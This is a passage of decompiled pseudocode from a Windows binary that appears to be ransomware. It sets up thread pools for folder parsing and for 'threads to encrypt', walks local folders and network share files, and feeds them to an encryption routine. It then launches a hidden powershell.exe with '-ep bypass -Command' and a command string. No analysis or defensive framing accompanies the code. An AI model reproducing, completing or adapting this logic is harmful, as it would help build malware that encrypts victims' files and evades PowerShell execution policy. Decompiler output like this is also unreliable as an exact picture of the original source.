    }
LABEL_249:
    v80 = 0;
    goto LABEL_250;
  }
  sub_140036FC0();
  v207 = v58;
  if ( dwNumberOfProcessors <= 4 )
  {
    if ( dwNumberOfProcessors == 1 )
      dwNumberOfProcessors = 2;
    dwNumberOfProcessors *= 2;
  }
  v137 = 30 * dwNumberOfProcessors / 100;
  v61 = 10 * dwNumberOfProcessors / 100;
  v131 = v61;
  if ( v61 == 0 )
  {
    v131 = 1;
    v61 = 1;
  }
  v138 = dwNumberOfProcessors - 30 * dwNumberOfProcessors / 100 - v61;
  v62 = sub_14003E800(a1: v190);
  v63 = sub_14003E3F0(a1: v189, a2: "Number of thread to folder parsers = ", a3: v62);
  sub_1400427F0(a1: v64, a2: v63);
  sub_1400371B0(a1: v189);
  sub_1400371B0(a1: v190);
  v65 = (_QWORD *)sub_14003E800(a1: &v183);
  v66 = v65[2];
  v67 = v65[3];
  if ( v67 - v66 < 0x2A )
  {
    v65 = (_QWORD *)sub_1400405F0(Src: v65, a2: "Number of thread to root folder parsers = ", Size: 0x2Au);
  }
  else
  {
    v65[2] = v66 + 42;
    v68 = (unsigned __int64)v65;
    if ( v67 >= 0x10 )
      v68 = *v65;
    if ( (unsigned __int64)"" <= v68 || (unsigned __int64)"Number of thread to root folder parsers = " > v68 + v66 )
    {
      v69 = 42;
    }
    else if ( v68 > (unsigned __int64)"Number of thread to root folder parsers = " )
    {
      v69 = v68 - (_QWORD)"Number of thread to root folder parsers = ";
    }
    else
    {
      v69 = 0;
    }
    memmove(a1: (void *)(v68 + 42), Src: (const void *)v68, Size: v66 + 1);
    memmove(a1: (void *)v68, Src: "Number of thread to root folder parsers = ", Size: v69);
    memmove(a1: (void *)(v68 + v69), Src: &aNumberOfThread_0[v69 + 42], Size: 42 - v69);
  }
  v141 = 0;
  v70 = 0;
  v142 = 0u;
  v141 = *(_OWORD *)v65;
  v142 = *((_OWORD *)v65 + 1);
  v65[2] = 0;
  v65[3] = 15;
  *(_BYTE *)v65 = 0;
  if ( qword_140102188 != 0 )
  {
    sub_140040440(a1: qword_140102188, a2: 2, a3: &v141);
    if ( qword_140102188 != 0 )
      (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
  }
  if ( *((_QWORD *)&v142 + 1) >= 0x10u )
  {
    v71 = (void *)v141;
    if ( (unsigned __int64)(*((_QWORD *)&v142 + 1) + 1LL) >= 0x1000 )
    {
      v71 = *(void **)(v141 - 8);
      if ( (unsigned __int64)(v141 - (_QWORD)v71 - 8) > 0x1F )
        goto LABEL_301;
    }
    j_j_free(Block: v71);
  }
  *(_QWORD *)&v142 = 0;
  *((_QWORD *)&v142 + 1) = 15;
  LOBYTE(v141) = 0;
  if ( v184 >= 0x10 )
  {
    v72 = v183;
    if ( v184 + 1 >= 0x1000 )
    {
      v72 = *((_BYTE **)v183 - 1);
      if ( (unsigned __int64)(v183 - v72 - 8) > 0x1F )
LABEL_301:
        invalid_parameter_noinfo_noreturn();
    }
    j_j_free(Block: v72);
  }
  v73 = (_QWORD *)sub_14003E800(a1: &v185);
  v74 = v73[2];
  v75 = v73[3];
  if ( v75 - v74 < 0x1F )
  {
    v73 = (_QWORD *)sub_1400405F0(Src: v73, a2: "Number of threads to encrypt = ", Size: 0x1Fu);
  }
  else
  {
    v73[2] = v74 + 31;
    v76 = (unsigned __int64)v73;
    if ( v75 >= 0x10 )
      v76 = *v73;
    if ( (unsigned __int64)"" <= v76 || (unsigned __int64)"Number of threads to encrypt = " > v76 + v74 )
    {
      v70 = 31;
    }
    else if ( v76 > (unsigned __int64)"Number of threads to encrypt = " )
    {
      v70 = v76 - (_QWORD)"Number of threads to encrypt = ";
    }
    memmove(a1: (void *)(v76 + 31), Src: (const void *)v76, Size: v74 + 1);
    memmove(a1: (void *)v76, Src: "Number of threads to encrypt = ", Size: v70);
    memmove(a1: (void *)(v76 + v70), Src: &aNumberOfThread_1[v70 + 31], Size: 31 - v70);
  }
  v143 = 0;
  v144 = 0u;
  v143 = *(_OWORD *)v73;
  v144 = *((_OWORD *)v73 + 1);
  v73[2] = 0;
  v73[3] = 15;
  *(_BYTE *)v73 = 0;
  if ( qword_140102188 != 0 )
  {
    sub_140040440(a1: qword_140102188, a2: 2, a3: &v143);
    if ( qword_140102188 != 0 )
      (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
  }
  if ( *((_QWORD *)&v144 + 1) >= 0x10u )
  {
    v77 = (void *)v143;
    if ( (unsigned __int64)(*((_QWORD *)&v144 + 1) + 1LL) >= 0x1000 )
    {
      v77 = *(void **)(v143 - 8);
      if ( (unsigned __int64)(v143 - (_QWORD)v77 - 8) > 0x1F )
        goto LABEL_302;
    }
    j_j_free(Block: v77);
  }
  *(_QWORD *)&v144 = 0;
  *((_QWORD *)&v144 + 1) = 15;
  LOBYTE(v143) = 0;
  if ( v186 >= 0x10 )
  {
    v78 = v185;
    if ( v186 + 1 < 0x1000 || (v78 = *((void **)v185 - 1), (unsigned __int64)((_BYTE *)v185 - (_BYTE *)v78 - 8) <= 0x1F) )
    {
      j_j_free(Block: v78);
      goto LABEL_151;
    }
LABEL_302:
    invalid_parameter_noinfo_noreturn();
  }
LABEL_151:
  v79 = (char *)operator new(Size: 0x180u);
  *(_QWORD *)&v149 = v79;
  v80 = 1;
  *((_DWORD *)v79 + 2) = 1;
  *((_DWORD *)v79 + 3) = 1;
  *(_QWORD *)v79 = &std::_Ref_count_obj2<ThreadPool>::`vftable';
  v81 = v79 + 16;
  sub_14007B6D0(a1: v79 + 16, a2: v137, a3: v131);
  if ( v79 != (char *)-16LL )
  {
    v82 = *((_QWORD *)v79 + 3);
    if ( v82 == 0 || *(_DWORD *)(v82 + 8) == 0 )
    {
      _InterlockedIncrement((volatile signed __int32 *)v79 + 2);
      _InterlockedIncrement((volatile signed __int32 *)v79 + 3);
      *(_QWORD *)v81 = v81;
      v83 = *((volatile signed __int32 **)v79 + 3);
      *((_QWORD *)v79 + 3) = v79;
      if ( v83 != nullptr && _InterlockedExchangeAdd(v83 + 3, 0xFFFFFFFF) == 1 )
        (*(void (__fastcall **)(volatile signed __int32 *))(*(_QWORD *)v83 + 8LL))(a1: v83);
      if ( _InterlockedExchangeAdd((volatile signed __int32 *)v79 + 2, 0xFFFFFFFF) == 1 )
      {
        (**(void (__fastcall ***)(void *))v79)(a1: v79);
        if ( _InterlockedExchangeAdd((volatile signed __int32 *)v79 + 3, 0xFFFFFFFF) == 1 )
          (*(void (__fastcall **)(char *))(*(_QWORD *)v79 + 8LL))(a1: v79);
      }
    }
  }
  v212 = 0;
  sub_140054D30(a1: &v212, a2: &v138);
  sub_140036FB0(a1: &v238);
  v238 = 0;
  v239 = 0;
  if ( (_QWORD)v225 != 0 && (unsigned __int8)sub_140042830(a1: &v224, a2: &v238) == 0 )
  {
    sub_1400372D0(a1: v187, a2: "Failed to read share files!");
    sub_140039EC0(a1: v84, a2: v187);
    sub_1400371B0(a1: v187);
    goto LABEL_235;
  }
  if ( v218[2] != 0 )
  {
    sub_1400434C0(a1: &v209, a2: v218);
    if ( v209 == 0 )
    {
      v85 = v210;
      if ( v24 == (void *)v150 || v210 == 0 )
      {
        qmemcpy(&v187[4], v218, 32);
        v218[2] = 0;
        v218[3] = 7;
        LOWORD(v218[0]) = 0;
        if ( *((_QWORD *)&v212 + 1) != 0 )
        {
          _InterlockedIncrement((volatile signed __int32 *)(*((_QWORD *)&v212 + 1) + 8LL));
          v85 = v210;
        }
        v149 = v212;
        sub_14007B850(
          a1: (_DWORD)v79 + 16,
          a2: (unsigned int)&v149,
          a3: (unsigned int)&v187[4],
          a4: (unsigned int)&v207,
          a5: v211,
          a6: v85);
      }
    }
  }
  else
  {
    v86 = v238;
    if ( (_QWORD)v238 == *((_QWORD *)&v238 + 1) )
    {
      v136 = (char *)v219[1];
      if ( v219[0] == v219[1] )
        goto LABEL_186;
      v94 = (char *)v219[0] + 32;
      v95 = (char *)v219[1];
      v96 = v211;
      v97 = (void *)v150;
      do
      {
        if ( v94[1] == 0 && (v24 == v97 || *v94 == 0) )
        {
          v98 = *v94;
          v99 = sub_14003B400(a1: v205, a2: v94 - 32);
          v100 = sub_14004F3F0(a1: v188, a2: &v212, a3: v99);
          sub_14007B850(a1: (_DWORD)v81, a2: v100, a3: v101, a4: (unsigned int)&v207, a5: v96, a6: v98);
          v95 = v136;
        }
        v94 += 40;
      }
      while ( v94 - 32 != v95 );
    }
    else
    {
      v87 = *((_QWORD *)&v238 + 1);
      v88 = v211;
      v89 = (void *)v150;
      do
      {
        sub_1400434C0(a1: &v211, a2: v86);
        if ( (_BYTE)v211 == 0 )
        {
          v90 = BYTE1(v211);
          if ( v24 == v89 || BYTE1(v211) == 0 )
          {
            v91 = sub_14003B400(a1: v206, a2: v86);
            v92 = sub_14004F3F0(a1: &v150, a2: &v212, a3: v91);
            sub_14007B850(a1: (_DWORD)v81, a2: v92, a3: v93, a4: (unsigned int)&v207, a5: v88, a6: v90);
          }
        }
        v86 += 32;
      }
      while ( v86 != v87 );
      v49 = (__int64)v136;
    }
    v79 = (char *)v149;
    v31 = v140;
  }
LABEL_186:
  if ( *((_DWORD *)v81 + 13) != 0 )
    sub_14007B510(a1: *((_QWORD *)v81 + 4));
  sub_14007B510(a1: *((_QWORD *)v81 + 2));
  v102 = v212;
  if ( *(_DWORD *)(v212 + 52) != 0 )
    sub_14007B510(a1: *(_QWORD *)(v212 + 32));
  sub_14007B510(a1: *(_QWORD *)(v102 + 16));
  sub_140084180(a1: v155);
  j_j_free(Block: v155);
  if ( v31 != v139 )
  {
    *(_OWORD *)lpParameters = 0;
    v216 = 0;
    v217 = 0;
    sub_14003EE60(a1: lpParameters, a2: L"-ep bypass -Command ", a3: 20);
    v103 = v216;
    if ( v216 >= v217 )
    {
      sub_140055CD0(Src: lpParameters);
    }
    else
    {
      ++v216;
      v104 = lpParameters;
      if ( v217 >= 8 )
        v104 = (LPCWSTR *)lpParameters[0];
      *(_DWORD *)((char *)v104 + 2 * v103) = 34;
    }
    sub_14003B2D0(Src: lpParameters);
    v105 = v216;
    if ( v216 >= v217 )
    {
      sub_140055CD0(Src: lpParameters);
    }
    else
    {
      ++v216;
      v106 = lpParameters;
      if ( v217 >= 8 )
        v106 = (LPCWSTR *)lpParameters[0];
      *(_DWORD *)((char *)v106 + 2 * v105) = 34;
    }
    v107 = (const WCHAR *)lpParameters;
    if ( v217 >= 8 )
      v107 = lpParameters[0];
    v139 = ShellExecuteW(
             hwnd: nullptr,
             lpOperation: nullptr,
             lpFile: L"powershell.exe",
             lpParameters: v107,
             lpDirectory: nullptr,
             nShowCmd: 0);
    if ( (int)v139 <= 32 )
    {
      v108 = sub_140054E50(a1: v192);
      v109 = sub_14003E3F0(a1: v191, a2: "ShellExecute failed: ", a3: v108);
      sub_140039EC0(a1: v110, a2: v109);
      sub_1400371B0(a1: v191);
      sub_1400371B0(a1: v192);
    }
    if ( v217 >= 8 )
    {
      v111 = (WCHAR *)lpParameters[0];
      if ( 2 * v217 + 2 >= 0x1000 )
      {
        v111 = *((WCHAR **)lpParameters[0] - 1);
        if ( (unsigned __int64)((char *)lpParameters[0] - (char *)v111 - 8) > 0x1F )
          invalid_parameter_noinfo_noreturn();
      }
      j_j_free(Block: v111);
    }
  }
  v112 = Query_perf_frequency();
  v113 = sub_140080F48();
  if ( v112 == 10000000 )
    v114 = 100 * v113;
  else
    v114 = 1000000000 * (v113 / v112) + 1000000000 * (v113 % v112) / v112;
  memset(a1: v244, Val: 0, Size: 0xF8u);
  sub_14003FA40(a1: v244, a2: 1);
  sub_14005AD40(a1: &v244[2], a2: (v114 - v49) / 1000000);
  v156 = 0;
  v157 = 0;
  v158 = 15;
  LOBYTE(v156) = 0;
  *(_OWORD *)Src = 0;
  v148 = 0;
  if ( (v244[17] & 0x22) == 2 || (v115 = *(_QWORD *)v244[11], *(_QWORD *)v244[11] == 0) )
  {
    if ( (v244[17] & 4) != 0 || (v118 = *(_QWORD *)v244[10], *(_QWORD *)v244[10] == 0) )
    {
      v117 = Src[1];
      v116 = Src[0];
    }
    else
    {
      v116 = *(void **)v244[6];
      Src[0] = v116;
      v117 = (void *)(v118 + *(int *)v244[13] - (_QWORD)v116);
      Src[1] = v117;
    }
  }
  else
  {
    v116 = *(void **)v244[7];
    Src[0] = *(void **)v244[7];
    if ( v115 < v244[16] )
      v115 = v244[16];
    v117 = (void *)(v115 - (_QWORD)v116);
    Src[1] = v117;
  }
  if ( v116 != nullptr )
    sub_14003C940(a1: &v156, Src: v116, Size: (size_t)v117);
  sub_14003B930(a1: v244, a2: v116, a3: v117);
  v119 = sub_140037430(Src: &v156);
  v145 = 0;
  v146 = 0u;
  v145 = *(_OWORD *)v119;
  v146 = *(_OWORD *)(v119 + 16);
  *(_QWORD *)(v119 + 16) = 0;
  *(_QWORD *)(v119 + 24) = 15;
  *(_BYTE *)v119 = 0;
  if ( qword_140102188 != 0 )
  {
    sub_140040440(a1: qword_140102188, a2: 2, a3: &v145);
    if ( qword_140102188 != 0 )
      (*(void (__fastcall **)(__int64))(*(_QWORD *)qword_140102188 + 24LL))(a1: qword_140102188);
  }
  if ( *((_QWORD *)&v146 + 1) >= 0x10u )
  {
    v120 = (void *)v145;
    if ( (unsigned __int64)(*((_QWORD *)&v146 + 1) + 1LL) >= 0x1000 )
    {
      v120 = *(void **)(v145 - 8);
      if ( (unsigned __int64)(v145 - (_QWORD)v120 - 8) > 0x1F )
        goto LABEL_304;
    }
    j_j_free(Block: v120);
  }
  *(_QWORD *)&v146 = 0;
  *((_QWORD *)&v146 + 1) = 15;
  LOBYTE(v145) = 0;
  if ( v158 >= 0x10 )
  {
    v121 = (void *)v156;
    if ( v158 + 1 < 0x1000 || (v121 = *(void **)(v156 - 8), (unsigned __int64)(v156 - (_QWORD)v121 - 8) <= 0x1F) )
    {
      j_j_free(Block: v121);
      goto LABEL_234;
    }
LABEL_304:
    invalid_parameter_noinfo_noreturn();
  }
LABEL_234:
  v80 = 0;
LABEL_235:
  sub_140045000(a1: &v238);
  if ( *((_QWORD *)&v212 + 1) != 0
    && _InterlockedExchangeAdd((volatile signed __int32 *)(*((_QWORD *)&v212 + 1) + 8LL), 0xFFFFFFFF) == 1 )
  {
    v122 = *((_QWORD *)&v212 + 1);
    (***((void (__fastcall ****)(_QWORD))&v212 + 1))(a1: *((_QWORD *)&v212 + 1));
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)(v122 + 12), 0xFFFFFFFF) == 1 )
      (*(void (__fastcall **)(_QWORD))(**((_QWORD **)&v212 + 1) + 8LL))(a1: *((_QWORD *)&v212 + 1));
  }
  if ( _InterlockedExchangeAdd((volatile signed __int32 *)v79 + 2, 0xFFFFFFFF) == 1 )
  {
    (**(void (__fastcall ***)(void *))v79)(a1: v79);
    if ( _InterlockedExchangeAdd((volatile signed __int32 *)v79 + 3, 0xFFFFFFFF) == 1 )
      (*(void (__fastcall **)(char *))(*(_QWORD *)v79 + 8LL))(a1: v79);
  }
LABEL_250:
  if ( v219[0] != nullptr )
  {
    sub_140055B30(a1: v219[0], a2: v219[1]);
    v123 = v219[0];
    if ( (unsigned __int64)(40 * ((signed __int64)(v220 - (unsigned __int64)v219[0]) / 40)) >= 0x1000 )
    {
      v123 = *((void **)v219[0] - 1);
      if ( (unsigned __int64)((char *)v219[0] - (char *)v123 - 8) > 0x1F )
        goto LABEL_283;
    }
    j_j_free(Block: v123);
    *(_OWORD *)v219 = 0;
    v220 = 0;
  }
LABEL_262:
  if ( *(_QWORD *)&cchWideChar[2] >= 8u )
  {
    v125 = (WCHAR *)lpWideCharStr[0];
    if ( (unsigned __int64)(2LL * *(_QWORD *)&cchWideChar[2] + 2) >= 0x1000 )
    {
      v125 = *((WCHAR **)lpWideCharStr[0] - 1);
      if ( (unsigned __int64)((char *)lpWideCharStr[0] - (char *)v125 - 8) > 0x1F )
        goto LABEL_283;
    }
    j_j_free(Block: v125);
  }
  *(_QWORD *)cchWideChar = 0;
  *(_QWORD *)&cchWideChar[2] = 7;
  LOWORD(lpWideCharStr[0]) = 0;
  if ( *((_QWORD *)&v222 + 1) >= 8u )
  {
    v126 = String[0];
    if ( (unsigned __int64)(2LL * *((_QWORD *)&v222 + 1) + 2) >= 0x1000 )
    {
      v126 = *((wchar_t **)String[0] - 1);
      if ( (unsigned __int64)((char *)String[0] - (char *)v126 - 8) > 0x1F )
        goto LABEL_283;
    }
    j_j_free(Block: v126);
  }
  *(_QWORD *)&v222 = 0;
  *((_QWORD *)&v222 + 1) = 7;
  LOWORD(String[0]) = 0;
  if ( *((_QWORD *)&v225 + 1) >= 8u )
  {
    v127 = (void *)v224;
    if ( (unsigned __int64)(2LL * *((_QWORD *)&v225 + 1) + 2) >= 0x1000 )
    {
      v127 = *(void **)(v224 - 8);
      if ( (unsigned __int64)(v224 - (_QWORD)v127 - 8) > 0x1F )
        goto LABEL_283;
    }
    j_j_free(Block: v127);
  }
  *(_QWORD *)&v225 = 0;
  *((_QWORD *)&v225 + 1) = 7;
  LOWORD(v224) = 0;
  if ( v218[3] >= 8u )
  {
    v128 = (void *)v218[0];
    if ( (unsigned __int64)(2LL * v218[3] + 2) >= 0x1000 )
    {
      v128 = *(void **)(v218[0] - 8LL);
      if ( (unsigned __int64)(v218[0] - (_QWORD)v128 - 8LL) > 0x1F )
        goto LABEL_283;
    }
    j_j_free(Block: v128);
  }
  v218[2] = 0;
  v218[3] = 7;
  LOWORD(v218[0]) = 0;
  if ( v243 >= 0x10 )
  {
    v129 = (void *)v241;
    if ( v243 + 1 < 0x1000 || (v129 = *(void **)(v241 - 8), (unsigned __int64)(v241 - (_QWORD)v129 - 8) <= 0x1F) )
    {
      j_j_free(Block: v129);
      return v80;
    }
LABEL_283:
    invalid_parameter_noinfo_noreturn();
  }
  return v80;
}